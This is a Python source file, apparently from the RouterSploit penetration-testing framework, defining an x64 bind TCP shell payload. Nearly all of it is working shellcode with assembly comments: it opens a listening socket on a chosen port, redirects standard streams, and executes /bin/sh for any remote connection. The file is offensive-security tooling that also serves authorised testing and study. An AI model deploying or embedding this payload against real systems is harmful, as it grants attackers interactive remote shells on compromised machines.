from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    BindTCPPayloadMixin,
)


class Payload(BindTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "X64 Bind TCP",
        "description": "Creates interactive tcp bind shell for X64 architecture.",
        "authors": (
            "ricky",  # metasploit module
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        )
    }

    architecture = Architectures.X64

    def generate(self):
        bind_port = utils.convert_port(self.rport)

        return (
            b"\x6a\x29" +                      # pushq  $0x29
            b"\x58" +                          # pop    %rax
            b"\x99" +                          # cltd
            b"\x6a\x02" +                      # pushq  $0x2
            b"\x5f" +                          # pop    %rdi
            b"\x6a\x01" +                      # pushq  $0x1
            b"\x5e" +                          # pop    %rsi
            b"\x0f\x05" +                      # syscall
            b"\x48\x97" +                      # xchg   %rax,%rdi
            b"\x52" +                          # push   %rdx
            b"\xc7\x04\x24\x02\x00" +          # movl   $0xb3150002,(%rsp)
            bind_port +                        # port
            b"\x48\x89\xe6" +                  # mov    %rsp,%rsi
            b"\x6a\x10" +                      # pushq  $0x10
            b"\x5a" +                          # pop    %rdx
            b"\x6a\x31" +                      # pushq  $0x31
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x6a\x32" +                      # pushq  $0x32
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x48\x31\xf6" +                  # xor    %rsi,%rsi
            b"\x6a\x2b" +                      # pushq  $0x2b
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x48\x97" +                      # xchg   %rax,%rdi
            b"\x6a\x03" +                      # pushq  $0x3
            b"\x5e" +                          # pop    %rsi
            b"\x48\xff\xce" +                  # dec    %rsi
            b"\x6a\x21" +                      # pushq  $0x21
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x75\xf6" +                      # jne    33 <dup2_loop>
            b"\x6a\x3b" +                      # pushq  $0x3b
            b"\x58" +                          # pop    %rax
            b"\x99" +                          # cltd
            b"\x48\xbb\x2f\x62\x69\x6e\x2f" +  # movabs $0x68732f6e69622f,%rbx
            b"\x73\x68\x00" +                  #
            b"\x53" +                          # push   %rbx
            b"\x48\x89\xe7" +                  # mov    %rsp,%rdi
            b"\x52" +                          # push   %rdx
            b"\x57" +                          # push   %rdi
            b"\x48\x89\xe6" +                  # mov    %rsp,%rsi
            b"\x0f\x05"                        # syscall
        )
